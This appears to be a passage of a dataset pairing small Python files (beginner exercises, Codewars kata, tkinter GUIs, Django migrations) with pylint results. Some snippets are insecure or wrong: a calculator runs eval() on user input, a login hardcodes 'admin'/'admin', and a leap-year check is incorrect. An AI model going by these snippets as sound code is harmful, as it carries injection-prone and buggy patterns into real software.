41   	print start
","41 - error: syntax-error
"
"1   #!/usr/bin/python
2   from collections import defaultdict
3   
4   def sum_for_list(lst):
5   	
6   	
7   	aDict = defaultdict(lambda : 0)
8   	
9   	
10   	def primes(n):
11   
12   		d = 2
13   		aN = n
14   		n = abs(n)
15   		while d*d <= n:
16   			aBool = True
17   			while (n % d) == 0:
18   				#primfac.add(d)   # supposing you want multiple factors repeated
19   				if aBool:
20   					aDict[d] += aN
21   					aBool = False
22   				n /= d
23   			d += 1
24   		if n > 1:
25   			aDict[n] += aN	
26   		return aDict
27   	for i in lst:
28   		primes(i)
29   		#primes(i)
30   
31   	
32   	result = [ [k,v] for k,v in aDict.iteritems()]
33   	result.sort(key = lambda x:x[0])
34   	return result
35   
36   a = [12,15]
37   b =  [15, 30, -45] 
38   c = [15, 21, 24, 30, 45]
39   test = sum_for_list(b)
40   
41   
42   #print test
43   #print sum_for_list(a)
44   d = sum_for_list(c)
45   print d
46   d.sort(key = lambda x: x[0] ,reverse =True)
47   print d
48    ","45 - error: syntax-error
"
"1   #!/usr/bin/python
2   '''
3   An Arithmetic Progression is defined as one in which there is a constant difference between the consecutive terms of a given series of numbers. You are provided with consecutive elements of an Arithmetic Progression. There is however one hitch: Exactly one term from the original series is missing from the set of numbers which have been given to you. The rest of the given series is the same as the original AP. Find the missing term.
4   
5   You have to write the function findMissing (list) , list will always be atleast 3 numbers.
6   
7   http://www.codewars.com/kata/52de553ebb55d1fca3000371/train/python
8   
9   '''
10   
11   
12   def find_missing(sequence):
13   	should = 1.0 * (sequence[0] + sequence[-1])* (len(sequence)+1) / 2
14   	actual = reduce(lambda x, y: x+y, sequence)
15   	#print actual
16   	return int(should - actual)
17   
18   
19   if __name__ == ""__main__"":
20   
21   
22   	a = [1, 2, 3, 4, 6, 7, 8, 9]
23   	print find_missing(a)","23 - error: syntax-error
"
"1   """"""
2   You have to create a function that takes a positive integer number and returns the next bigger number formed by the same digits:
3   
4   
5   http://www.codewars.com/kata/55983863da40caa2c900004e/train/python
6   
7   """"""
8   
9   def next_bigger(n):
10       #your code here
11       ","11 - error: syntax-error
"
"1   """"""
2   	Decimal to any Rational or Irrational Base Converter	
3   	http://www.codewars.com/kata/5509609d1dbf20a324000714/train/python
4   
5   	wiki_page : https://en.wikipedia.org/wiki/Non-integer_representation
6   
7   """"""
8   import math
9   from math import pi , log
10   '''
11   def converter(n, decimals=0, base=pi):
12       """"""takes n in base 10 and returns it in any base (default is pi
13       with optional x decimals""""""
14       #your code here
15       alpha = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
16       m = 1
17       if n < 0:
18           n = -n
19           m = -m
20      
21       times = 0 if n == 0 else int(math.floor(math.log(n, base))) 
22       
23       result = ''
24   
25       while times >= -decimals :
26           if times == -1:
27               result += '.'
28           val = int(n / base**times)
29   
30           result+=alpha[val]
31           #print ""base time "" ,n/(base**times)
32           n -= int(n / base**times) * base**times
33          
34           #print result,n , times
35          
36           times-=1
37       if m == -1:
38           result = '-'+result
39       result = str(result)
40       if decimals != 0:
41           loc = result.index('.')
42           last = len(result)-1
43           if decimals > last - loc:
44               result+='0'* (decimals-(last - loc))
45       return result
46       
47   '''
48   
49   
50   def converter(n , decimals = 0 , base = pi):
51       alpha = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
52       if n == 0 : return '0' if not decimals else '0.' + '0'*decimals
53   
54       result = '' if n > 0 else '-'
55   
56       n = abs(n)
57   
58       for i in range(int(log(n, base)) , -decimals -1, -1 ):
59           if i == -1: 
60               result += '.'
61           result +=  alpha[int(n / base**i)]
62           n %= base**i
63       return result
64   
65   def main():
66       print converter(0,4,26)
67       print converter(-15.5,2,23)
68       print converter(13,0,10)
69       print converter(5.5, 1,10)
70   if __name__ == '__main__':
71   	main()
72       
","66 - error: syntax-error
"
"1   l = [1, 5, 12, 2, 15, 6]
2   i = 0
3   s = 0
4   for i in l:
5       s += i
6   print(s)
7   
8   i = 0
9   s = 0
10   while i<len(l):
11       s += l[i]
12       i += 1
13   print(s)","Clean Code: No Issues Detected
"
"1   import datetime as dt
2   today = dt.datetime.today()
3   yesterday = today - dt.timedelta(days=1)
4   tomorrow = today + dt.timedelta(days=1)
5   
6   print(""Yesterday"", yesterday)
7   print(""Today"", today)
8   print(""Tomorrow"", tomorrow)","Clean Code: No Issues Detected
"
"1   #Write a python program to find the longest word in a file.
2   f = open(""demo.txt"", ""r"")
3   line = f.readline()
4   longestWord = """"
5   while line:
6       words = line.split("" "")
7       lineLongestWord = max(words, key=len)
8       if len(lineLongestWord) > len(longestWord):
9           longestWord = lineLongestWord
10   
11       line = f.readline()
12   
13   print(""Longest word"")
14   print(longestWord)","2 - warning: unspecified-encoding
2 - refactor: consider-using-with
"
"1   # 0 1 1 2 3 5 8
2   def fib(n):
3       a = 0
4       b = 1
5       print(a, end="" "")
6       print(b, end="" "")
7       for i in range(2, n):
8           c = a + b
9           print(c, end="" "")
10           a = b
11           b = c
12   
13   n = int(input(""Enter the number\n""))
14   fib(n)","2 - warning: redefined-outer-name
7 - warning: unused-variable
"
"1   import datetime as dt
2   today = dt.datetime.today()
3   print(""Current date and time"", dt.datetime.now())
4   print(""Current Time in 12 Hours Format"", today.strftime(""%I:%M:%S %p""))
5   print(""Current year"", today.year)
6   print(""Month of the year"", today.strftime(""%B""))
7   print(""Week number of the year"", today.strftime(""%W""))
8   print(""Week day of the week"", today.strftime(""%A""))
9   print(""Day of the year"", today.strftime(""%j""))
10   print(""Day of the month"", today.strftime(""%d""))
11   print(""Day of the week"", today.strftime(""%w""))","Clean Code: No Issues Detected
"
"1   x = input(""Enter a string \n"")
2   d = l = 0
3   
4   for c in x:
5       if c.isalpha():
6           l += 1
7   
8       if c.isdigit():
9           d += 1;
10   
11   print(""Letters %d"" % (l))
12   print(""Digits %d"" % (d))","9 - warning: unnecessary-semicolon
"
"1   x = 65
2   for i in range(5):
3       for j in range(i+1):
4           print(chr(x+j), end="" "")
5   
6       print()","Clean Code: No Issues Detected
"
"1   import datetime as dt
2   today = dt.datetime.today()
3   for i in range(1, 6):
4       nextday = today + dt.timedelta(days=i)
5       print(nextday)","Clean Code: No Issues Detected
"
"1   class Student:
2       def __init__(self, name, roll_no):
3           self.name = name
4           self.roll_no = roll_no
5           self.age = 0
6           self.marks = 0
7   
8       def display(self):
9           print(""Name"", self.name)
10           print(""Roll No"", self.roll_no)
11           print(""Age"", self.age)
12           print(""Marks"", self.marks)
13   
14       def setAge(self, age):
15           self.age = age
16   
17       def setMarks(self, marks):
18           self.marks = marks
19   
20   s1 = Student(""Sahil"", 12)
21   s1.setAge(20)
22   s1.setMarks(90)
23   s1.display()
24   
25   s2 = Student(""Rohit"", 20)
26   s2.display()","Clean Code: No Issues Detected
"
"1   x = int(input(""Enter a number\n""))
2   for i in range(x):
3       print(i ** 2)
","Clean Code: No Issues Detected
"
"1   p = 3
2   n = 1
3   for i in range(4):
4       for j in range(7):
5           if j >= p and j <= p+n-1:
6               print(""X"", end="" "")
7           else:
8               print("" "", end="" "")
9   
10       print()
11       p -= 1
12       n += 2
13   
14   print(""The python string multiplication way"")
15   p = 3
16   n = 1
17   for i in range(4):
18       print(""  "" * p, end="""")
19       print(""X "" * n, end="""")
20       print()
21       p -= 1
22       n += 2","5 - refactor: chained-comparison
"
"1   # Given the participants' score sheet for your University Sports Day,
2   # you are required to find the runner-up score. You are given n scores.
3   # Store them in a list and find the score of the runner-up.
4   
5   score_str = input(""Enter scores\n"")
6   score_list = score_str.split("" "")
7   highestScore = 0;
8   rupnnerUp = 0
9   for score in score_list:
10       score = int(score)
11       if score > highestScore:
12           highestScore = score
13   
14   for score in score_list:
15       score = int(score)
16       if score > rupnnerUp and score < highestScore:
17           rupnnerUp = score
18   
19   print(rupnnerUp)","7 - warning: unnecessary-semicolon
11 - refactor: consider-using-max-builtin
16 - refactor: chained-comparison
"
"1   samples = (1, 2, 3, 4, 12, 5, 20, 11, 21)
2   e = o = 0
3   for s in samples:
4       if s % 2 == 0:
5           e += 1
6       else:
7           o += 1
8   
9   print(""Number of even numbers : %d"" % (e))
10   print(""Number of odd numbers : %d"" % (o))","Clean Code: No Issues Detected
"
"1   # Consider that vowels in the alphabet are a, e, i, o, u and y.
2   # Function score_words takes a list of lowercase words as an
3   # argument and returns a score as follows:
4   # The score of a single word is 2 if the word contains an even number
5   # of vowels. Otherwise, the score of this word is 1 . The score for the
6   # whole list of words is the sum of scores of all words in the list.
7   # Debug the given function score_words such that it returns a correct
8   # score.
9   
10   # Rules:
11   # even number of vowels then score is 2
12   # odd number of vowels then score is 1
13   
14   vowels = [""a"", ""e"", ""i"", ""o"", ""u""]
15   
16   def score_word(word):
17       v = 0
18       for c in word:
19           if c in vowels:
20               v += 1
21   
22       if v % 2 == 0:
23           return 2
24       else:
25           return 1
26   
27   def score_words(words):
28       score = 0;
29       for word in words:
30           score += score_word(word)
31       return score
32   
33   sentance = input(""Enter a sentance\n"")
34   words = sentance.split("" "")
35   print(score_words(words))","28 - warning: unnecessary-semicolon
22 - refactor: no-else-return
27 - warning: redefined-outer-name
"
"1   # GUI Programing
2   # Tkinter
3   
4   import tkinter as tk
5   from tkinter import messagebox
6   
7   # 1. Intialize Root Window
8   root = tk.Tk()
9   root.title(""Login Application"")
10   root.geometry(""200x200"")
11   
12   # 2. Application Logic
13   
14   # 3. Intialize widgets
15   
16   # 4. Placement of widgets (pack, grid, place)
17   
18   
19   # 5. Running the main looper
20   root.mainloop()","5 - warning: unused-import
"
"1   x = int(input(""Enter the value of X\n""))
2   if x%2 != 0:
3       print(""Weird"")
4   elif x >= 2 and x <= 5:
5       print(""Not Weird"")
6   elif x >= 6 and x<= 20:
7       print(""Weird"")
8   elif x > 20:
9       print(""Not Weird"")","4 - refactor: chained-comparison
6 - refactor: chained-comparison
"
"1   # Make a two-player Rock-Paper-Scissors game. (Hint: Ask for player
2   # plays (using input), compare them, print out a message of
3   # congratulations to the winner, and ask if the players want to start a
4   # new game)
5   
6   def is_play_valid(play):
7       if play != 'rock' and play != 'paper' and play != 'scissors':
8           return False
9       else:
10           return True
11   
12   def play_game():
13       p1 = input(""Player 1, what are you playing?\n"")
14       while not is_play_valid(p1):
15           p1 = input(""Wrong play, please play again.\n"")
16   
17       p2 = input(""Player 2, what are you playing?\n"")
18       while not is_play_valid(p2):
19           p2 = input(""Wrong play, please play again.\n"")
20   
21       # Game Logic
22       if p1 == p2:
23           print(""Its a tie!"")
24       elif p1 == ""rock"":
25           if p2 == 'scissors':
26               print(""Player 1 wins"")
27           else:
28               print(""Player 2 wins"")
29       elif p1 == ""paper"":
30           if p2 == ""rock"":
31               print(""Player 1 wins"")
32           else:
33               print(""Player 2 wins"")
34       else:
35           if p2 == 'paper':
36               print(""Player 1 wins"")
37           else:
38               print(""Player 2 wins"")
39   
40       ans = input(""Do you want to start a new game?\n"")
41       if ans == 'yes':
42           print(""Starting a new game"")
43           play_game()
44   
45   play_game()","7 - refactor: no-else-return
7 - refactor: consider-using-in
"
"1   def add(a, b):
2       return a + b
3   
4   def sub(a, b):
5       return a - b
6   
7   def pow(a,b):
8       return a ** b
9   
10   if __name__ != ""__main__"":
11       print(""Basic Module Imported"")","7 - warning: redefined-builtin
"
"1   w = input(""Enter a word"")
2   r = """";
3   for a in w:
4       r = a + r
5   
6   print(r)","2 - warning: unnecessary-semicolon
"
"1   def checkPrime(x):
2       for i in range(2, x):
3           if x % i == 0:
4               print(""Not a prime number"")
5               break;
6       else:
7           print(""Print number"")
8   
9   x = int(input(""Enter any number\n""))
10   checkPrime(x)","5 - warning: unnecessary-semicolon
1 - warning: redefined-outer-name
"
"1   # Generate a random number between 1 and 9 (including 1 and 9).
2   # Ask the user to guess the number, then tell them whether they
3   # guessed too low, too high, or exactly right.
4   
5   import random as r
6   a = r.randint(1, 9)
7   
8   def ask_user():
9       u = int(input(""Guess the number?\n""))
10   
11       if a == u:
12           print(""Exactly"")
13       elif a > u:
14           print(""Too low"")
15           ask_user()
16       else:
17           print(""Too high"")
18           ask_user()
19   
20   ask_user()
","Clean Code: No Issues Detected
"
"1   for i in range(5):
2       for j in range(i+1):
3           print(i+1, end="" "")
4   
5       print()
6   
7   print(""The python way..."")
8   for i in range(5):
9       print(str(str(i+1) + "" "") * int(i+1))","Clean Code: No Issues Detected
"
"1   # GUI Programing
2   # Tkinter
3   
4   import tkinter as tk
5   from tkinter import messagebox
6   
7   ## Welcome Window
8   def show_welcome():
9       welcome = tk.Tk()
10       welcome.title(""Welcome ADMIN"")
11       welcome.geometry(""200x200"")
12       welcome.mainloop()
13   
14   
15   ## Login Window
16   # 1. Intialize Root Window
17   root = tk.Tk()
18   root.title(""Login Application"")
19   root.geometry(""200x200"")
20   
21   # 2. Application Logic
22   def button1Click():
23       username = entry1.get()
24       password = entry2.get()
25       if username == 'admin' and password == 'admin':
26           messagebox.showinfo(""Login Application"", ""Login Successfull!"")
27           root.destroy()
28           show_welcome()
29       else:
30           messagebox.showerror(""Login Application"", ""Login Failed!"")
31   
32   def button2Click():
33       if messagebox.askokcancel(""Login Application"", ""Do you want to quit?""):
34           root.destroy()
35   
36   # 3. Intialize widgets
37   label1 = tk.Label(root, text=""Username"")
38   label2 = tk.Label(root, text=""Password"")
39   entry1 = tk.Entry(root)
40   entry2 = tk.Entry(root)
41   button1 = tk.Button(root, text=""Login"", command=button1Click)
42   button2 = tk.Button(root, text=""Quit"", command=button2Click)
43   
44   # 4. Placement of widgets (pack, grid, place)
45   label1.grid(row=1, column=1, pady=10)
46   label2.grid(row=2, column=1, pady=10)
47   entry1.grid(row=1, column=2)
48   entry2.grid(row=2, column=2)
49   button1.grid(row=3, column=2)
50   button2.grid(row=3, column=1)
51   
52   # 5. Running the main looper
53   root.mainloop()
54   print(""END"")","Clean Code: No Issues Detected
"
"1   # Password generator
2   import random as r
3   lenth = int(input(""Enter the length of password\n""))
4   password = """"
5   for i in range(lenth):
6       password += chr(r.randint(33, 123))
7   
8   print(password)","Clean Code: No Issues Detected
"
"1   # GUI Calculator Program
2   import tkinter as tk
3   
4   # Intialize window
5   window = tk.Tk()
6   window.title(""Calculator"")
7   
8   # Application Logic
9   result = tk.StringVar()
10   def add(value):
11       result.set(result.get() + value)
12   def peform():
13       result.set(eval(result.get()))
14   def clear():
15       result.set("""")
16   
17   # Initialize Widgets
18   label1 = tk.Label(window, textvariable=result)
19   button1 = tk.Button(window, text=""1"", padx=10, pady=10, bg=""white"", fg=""black"", command=lambda : add(""1""))
20   button2 = tk.Button(window, text=""2"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""2""))
21   button3 = tk.Button(window, text=""3"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""3""))
22   
23   button4 = tk.Button(window, text=""4"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""4""))
24   button5 = tk.Button(window, text=""5"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""5""))
25   button6 = tk.Button(window, text=""6"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""6""))
26   
27   button7 = tk.Button(window, text=""7"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""7""))
28   button8 = tk.Button(window, text=""8"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""8""))
29   button9 = tk.Button(window, text=""9"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""9""))
30   
31   button0 = tk.Button(window, text=""0"", padx=10, pady=10, bg=""white"", fg=""black"",command=lambda : add(""0""))
32   button_dot = tk.Button(window, text=""."", padx=10, pady=10, bg=""#eee"", fg=""black"",command=lambda : add("".""))
33   button_equal = tk.Button(window, text=""="", padx=10, pady=10, bg=""green"", fg=""white"",command=peform)
34   button_clear = tk.Button(window, text=""C"", padx=10, pady=10, bg=""white"", fg=""black"",command=clear)
35   
36   button_multiply = tk.Button(window, text=""*"", padx=10, pady=10, bg=""#eee"", fg=""black"",command=lambda : add(""*""))
37   button_minus = tk.Button(window, text=""-"", padx=10, pady=10, bg=""#eee"", fg=""black"",command=lambda : add(""-""))
38   button_add = tk.Button(window, text=""+"", padx=10, pady=10, bg=""#eee"", fg=""black"",command=lambda : add(""+""))
39   # Placement of Widgets
40   # Row0
41   label1.grid(row=0, column=0, columnspan=3, sticky=""W"")
42   # Row1
43   button7.grid(row=1, column=0)
44   button8.grid(row=1, column=1)
45   button9.grid(row=1, column=2)
46   button_multiply.grid(row=1, column=3)
47   # Row2
48   button4.grid(row=2, column=0)
49   button5.grid(row=2, column=1)
50   button6.grid(row=2, column=2)
51   button_minus.grid(row=2, column=3)
52   # Row3
53   button1.grid(row=3, column=0)
54   button2.grid(row=3, column=1)
55   button3.grid(row=3, column=2)
56   button_add.grid(row=3, column=3)
57   # Row4
58   button_clear.grid(row=4, column=0)
59   button0.grid(row= 4, column=1)
60   button_dot.grid(row= 4, column=2)
61   button_equal.grid(row= 4, column=3)
62   # Main Loop
63   window.mainloop()","13 - warning: eval-used
"
"1   #Write a python program to count the numbers of alphabets, digits and spaces in a file.
2   
3   f = open(""demo.txt"", ""r"")
4   alphabets = 0
5   digits = 0
6   spaces = 0
7   others = 0
8   lines = f.readlines()
9   for line in lines:
10       for c in line:
11           if c.isalpha():
12               alphabets += 1
13           elif c.isdigit():
14               digits += 1
15           elif c.isspace():
16               spaces += 1
17           else:
18               others += 1
19   
20   
21   print(""Number of alphabets"", alphabets)
22   print(""Number of digits"", digits)
23   print(""Number of spaces"", spaces)
24   print(""Others"", others)","3 - warning: unspecified-encoding
3 - refactor: consider-using-with
"
"1   def is_leap(y):
2       return y % 4 == 0
3   
4   y = int(input(""Enter a year\n""))
5   if is_leap(y):
6       print(""Leap year"")
7   else:
8       print(""Not a Leap Year"")","1 - warning: redefined-outer-name
"
"1   # To find a factorial of a number
2   # 5! = 5 * 4 * 3 * 2 * 1
3   
4   # fact(5) = 5 * fact(4)
5   # fact(4) = 4 * fact(3)
6   # fact(3) = 3 * fact(2)
7   # fact(2) = 2 * fact(1)
8   # fact(1) = 1
9   
10   # fact(5) = 5 * 4 * 3 * 2 * 1
11   
12   def fact(n):
13       if n == 1:
14           return 1
15       return n * fact(n-1)
16   
17   n = 5
18   result = fact(n)
19   print(result)","12 - warning: redefined-outer-name
"
"1   for i in range(5):
2       for j in range(5-i):
3           print(""X"", end="" "")
4   
5       print()
6   
7   for i in range(5):
8       print(""X "" * int(5-i))","Clean Code: No Issues Detected
"
"1   from django.shortcuts import render,redirect
2   from .models import Jogo
3   from django.views.decorators.csrf import csrf_protect
4   
5   #método para chamar todos os objetos que estão na classe Jogo quando entrar na home page
6   def home_page(request):
7       jogo = Jogo.objects.all()
8       return render (request,'home.html',{'jogo':jogo})
9   
10   #método para inserir os dados na tabela quando o botão ser clicado
11   def inserir(request):
12       placar = request.POST.get('nPlacar')
13       
14       #método para buscar os valores do objeto anterior
15       try:
16           placarMin = int(Jogo.objects.earliest('placarMin').placarMin)
17           placarMax = int(Jogo.objects.latest('placarMax').placarMax)
18           quebraRecMin = int(Jogo.objects.latest('quebraRecMin').quebraRecMin)
19           quebraRecMax = int(Jogo.objects.latest('quebraRecMax').quebraRecMax)
20       except:
21           placarMin = False
22           placarMax = False
23           quebraRecMin = False
24           quebraRecMax = False
25           
26       placar = int(placar)
27   
28       #condição para adicionar o placar nos demais atributos alem dele mesmo
29       if placarMin is False:
30           placarMin = placar
31           placarMax = placar
32       elif placar < placarMin:
33           placarMin = placar
34           quebraRecMin += 1
35       elif placar > placarMax or placarMax is False:
36           placarMax = placar
37           quebraRecMax += 1
38       else:
39           quebraRecMin = quebraRecMin+ 0 
40           quebraRecMmax = quebraRecMax+ 0     
41   
42       #método para criar o objeto já com os atributos populados    
43       jogo = Jogo.objects.create(placarMin=placarMin,placar=placar,placarMax=placarMax,quebraRecMin=quebraRecMin,quebraRecMax=quebraRecMax)
44       return redirect('/') #função para ficar home page após inserir o dado e clica no botão inserir ","2 - error: relative-beyond-top-level
20 - warning: bare-except
40 - warning: unused-variable
43 - warning: unused-variable
3 - warning: unused-import
"
"1   # Generated by Django 3.1 on 2020-10-01 01:54
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('core', '0001_initial'),
10       ]
11   
12       operations = [
13           migrations.RemoveField(
14               model_name='jogo',
15               name='id',
16           ),
17           migrations.AlterField(
18               model_name='jogo',
19               name='idJogo',
20               field=models.AutoField(primary_key=True, serialize=False),
21           ),
22           migrations.AlterField(
23               model_name='jogo',
24               name='placar',
25               field=models.IntegerField(),
26           ),
27       ]
","6 - refactor: too-few-public-methods
"
"1   from django.db import models
2   
3   #criação da classe com os atributos
4   class Jogo(models.Model):
5       idJogo = models.AutoField(primary_key=True)
6       placar = models.IntegerField()
7       placarMin = models.IntegerField()
8       placarMax = models.IntegerField()
9       quebraRecMin = models.IntegerField()
10       quebraRecMax = models.IntegerField()
11   
12       def __str__(self):
13           return str(self.idJogo)
14   
","4 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.1.1 on 2020-09-28 18:50
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       initial = True
9   
10       dependencies = [
11       ]
12   
13       operations = [
14           migrations.CreateModel(
15               name='Jogo',
16               fields=[
17                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
18                   ('idJogo', models.IntegerField()),
19                   ('placar', models.IntegerField(max_length=3)),
20                   ('placarMin', models.IntegerField()),
21                   ('placarMax', models.IntegerField()),
22                   ('quebraRecMin', models.IntegerField()),
23                   ('quebraRecMax', models.IntegerField()),
24               ],
25           ),
26       ]
","6 - refactor: too-few-public-methods
"
"1   import os
2   import sys
3   import logging
4   from time import time
5   
6   
7   class AppFilter(logging.Filter):
8       def filter(self, record):
9           record.function_id = os.environ.get(""function_id"", 'no_function_id')
10           record.request_id = os.environ.get(""request_id"", 'no_request_id')
11           return True
12   
13   
14   logger = logging.getLogger('pratai')
15   logger.setLevel(logging.DEBUG)
16   
17   # Docker can log stdout and stderr
18   handler = logging.StreamHandler(sys.stdout)
19   handler.setLevel(logging.DEBUG)
20   
21   formatter = logging.Formatter('%(asctime)s - %(function_id)s - %(request_id)s - %(levelname)s - %(message)s')
22   logger.addFilter(AppFilter())
23   
24   handler.setFormatter(formatter)
25   logger.addHandler(handler)
26   
27   
28   def load_function_from_filesystem(path='/etc/pratai/'):
29       sys.path.append(path)
30       from new_module import main
31       return main
32   
33   
34   def load_payload():
35       payload = os.environ.get(""pratai_payload"", None)
36       return payload
37   
38       
39   def execute_function():
40       f = load_function_from_filesystem()
41   
42       payload = load_payload()
43   
44       start = time()
45   
46       logger.debug(""function started with payload {0}"".format(str(payload)))
47   
48       result = None
49       try:
50           result = f(payload)
51           status = 'succeeded'
52       except Exception as err:
53           status = 'failed'
54           logger.error(err.message, exc_info=True)
55   
56       finish = time()
57   
58       logger.debug(""function {0}, it took {1} seconds with response {2}""
59                    .format(status, str(finish-start), str(result)))
60   
61       return result
62   
63   
64   if __name__ == '__main__':
65       r = execute_function()
66   
67   
","7 - refactor: too-few-public-methods
46 - warning: logging-format-interpolation
52 - warning: broad-exception-caught
54 - error: no-member
58 - warning: logging-format-interpolation
"
"1   #Problem Given
2   #Convert a string containing only lower case letter to a string with upper case
3   #It is expected to solve the problem within O(sizeof(str) 
4   #Auxilary Space O(1)
5   
6   #function to convert string into upper
7   def to_upper(str):
8           #temp will store the intger value of 1st letter of the string 
9           temp = 0        
10           #loop will run till the end of string
11           for i in range(len(str)):
12               #ord converts the char into its equivalent integer value
13               #ord(str[0]) - 32, so we will get ASCII value of upper case
14               temp  = ord(str[0])-32
15               #storing string in the same string but removing the first element
16               str = str[1::]
17               #chr converts integer into its equivalent char value
18               #adding or concatenating the str and temp together then storing it in str
19               str = str+chr(temp)
20           
21           #return str    
22           return str
23   
24   if __name__ == ""__main__"":
25       n = input()
26       print(to_upper(n))","9 - warning: bad-indentation
11 - warning: bad-indentation
14 - warning: bad-indentation
16 - warning: bad-indentation
19 - warning: bad-indentation
22 - warning: bad-indentation
7 - warning: redefined-builtin
11 - warning: unused-variable
"
"1   import pandas as pd
2   protein_data=pd.read_csv('../data/protein_classification.csv')
3   X=protein_data['Sequence']
4   def split(word): 
5         return [char for char in word] 
6   
7   sequences = [split(x) for x in X]
8   protein_data=pd.read_csv('../data/protein_classification.csv')
9   X=protein_data['Sequence']
10   
11   import string
12   # import sgtdev as sgt
13   from sgt import Sgt
14   # Spark
15   from pyspark import SparkContext
16   sc = SparkContext(""local"", ""app"")
17   rdd = sc.parallelize(sequences)
18   sgt_sc = Sgt(kappa = 1, lengthsensitive = False, mode=""spark"", alphabets=list(string.ascii_uppercase))
19   rdd_embedding = sgt_sc.fit_transform(corpus=rdd)
20   
21   sc.stop()
22   # Multi-processing
23   sgt_mp = Sgt(kappa = 1, lengthsensitive = False, mode=""multiprocessing"", processors=3)
24   mp_embedding = sgt_mp.fit_transform(corpus=sequences)
25   mp_embedding = sgt_mp.transform(corpus=sequences)
26   # Default
27   sgt = Sgt(kappa = 1, lengthsensitive = False)
28   embedding = sgt.fit_transform(corpus=sequences)
29   
30   # Spark again
31   corpus = [[""B"",""B"",""A"",""C"",""A"",""C"",""A"",""A"",""B"",""A""], [""C"", ""Z"", ""Z"", ""Z"", ""D""]]
32   
33   sc = SparkContext(""local"", ""app"")
34   
35   rdd = sc.parallelize(corpus)
36   
37   sgt_sc = Sgt(kappa = 1, 
38                    lengthsensitive = False, 
39                    mode=""spark"", 
40                    alphabets=[""A"", ""B"", ""C"", ""D"", ""Z""],
41                    lazy=False)
42   s = sgt_sc.fit_transform(corpus=rdd)
43   print(s)
44   sc.stop()","5 - warning: bad-indentation
5 - refactor: unnecessary-comprehension
"
"1   # Generated by Django 3.0.2 on 2020-03-28 23:19
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0003_song_release_year'),
10       ]
11   
12       operations = [
13           migrations.CreateModel(
14               name='Track',
15               fields=[
16                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
17                   ('track_name', models.CharField(max_length=500)),
18                   ('track_artist', models.CharField(max_length=500)),
19                   ('track_duration', models.IntegerField(default=200000)),
20                   ('track_popularity', models.IntegerField(default=100)),
21               ],
22           ),
23       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.0.2 on 2020-03-29 10:13
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0004_track'),
10       ]
11   
12       operations = [
13           migrations.AlterField(
14               model_name='track',
15               name='track_duration',
16               field=models.CharField(max_length=5),
17           ),
18       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.0.2 on 2020-03-13 17:36
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0001_initial'),
10       ]
11   
12       operations = [
13           migrations.CreateModel(
14               name='Song',
15               fields=[
16                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
17                   ('song_name', models.CharField(max_length=200)),
18                   ('song_artist', models.CharField(max_length=200)),
19               ],
20           ),
21       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.0.2 on 2020-03-15 16:01
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0002_song'),
10       ]
11   
12       operations = [
13           migrations.AddField(
14               model_name='song',
15               name='release_year',
16               field=models.IntegerField(default=2000),
17           ),
18       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.0.2 on 2020-04-11 18:42
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0006_auto_20200329_1329'),
10       ]
11   
12       operations = [
13           migrations.AddField(
14               model_name='track',
15               name='track_id',
16               field=models.CharField(default=0, max_length=30),
17               preserve_default=False,
18           ),
19       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.0.2 on 2020-03-29 10:29
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0005_auto_20200329_1313'),
10       ]
11   
12       operations = [
13           migrations.AlterField(
14               model_name='track',
15               name='track_duration',
16               field=models.CharField(max_length=10),
17           ),
18       ]
","6 - refactor: too-few-public-methods
"
"1   from django.apps import AppConfig
2   
3   
4   class OhjelmaConfig(AppConfig):
5       name = 'ohjelma'
","4 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.0.2 on 2020-04-11 19:11
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('ohjelma', '0008_track_track_danceability'),
10       ]
11   
12       operations = [
13           migrations.AddField(
14               model_name='track',
15               name='track_acousticness',
16               field=models.FloatField(default=0, max_length=10),
17               preserve_default=False,
18           ),
19           migrations.AddField(
20               model_name='track',
21               name='track_energy',
22               field=models.FloatField(default=0, max_length=10),
23               preserve_default=False,
24           ),
25           migrations.AddField(
26               model_name='track',
27               name='track_instrumentalness',
28               field=models.FloatField(default=0, max_length=10),
29               preserve_default=False,
30           ),
31           migrations.AddField(
32               model_name='track',
33               name='track_key',
34               field=models.IntegerField(default=0, max_length=3),
35               preserve_default=False,
36           ),
37           migrations.AddField(
38               model_name='track',
39               name='track_liveness',
40               field=models.FloatField(default=0, max_length=10),
41               preserve_default=False,
42           ),
43           migrations.AddField(
44               model_name='track',
45               name='track_loudness',
46               field=models.FloatField(default=0, max_length=10),
47               preserve_default=False,
